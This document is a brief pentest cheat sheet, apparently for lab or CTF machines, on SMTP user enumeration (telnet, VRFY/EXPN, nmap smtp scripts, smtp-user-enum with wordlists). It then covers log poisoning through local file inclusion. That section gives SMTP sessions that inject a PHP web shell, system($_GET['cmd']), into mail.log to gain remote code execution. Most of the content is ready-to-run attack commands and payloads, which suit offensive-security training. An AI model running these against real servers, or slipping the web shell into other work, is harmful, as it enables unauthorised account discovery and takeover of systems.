# SMTP Enumeration

- port 25

```
telnet 192.168.1.107 25
```

```
EXPN  - 用黎拎mailing list
VRFY  - 查一個user係咪exists
```

- check domain name

```
HELO 10.11.1.231
```

- nmap script scan

```
nmap 10.11.1.229 -p 25 --script=smtp-*
```

- user-enum

```
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.1.72
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.11.1.231
```

## SMTP Log Poisoning through LFI to Remote Code Execution

If you are able to access the mail.log(`/var/log/mail.log`) file due to LFI, it means the mail.log has read and write permission and hence we can infect the log file by injecting malicious code.

```
telnet (IP) 25

> MAIL FROM: test@symfonos.localdomain
> RCPT TO: helios@symfonos.localdomain
> DATA
<?php system($_GET['cmd']); ?>
> QUIT
```

```
MAIL FROM:<rrajchandel@gmail.com>
RCPT TO:<?php system($_GET['cmd']); ?>
```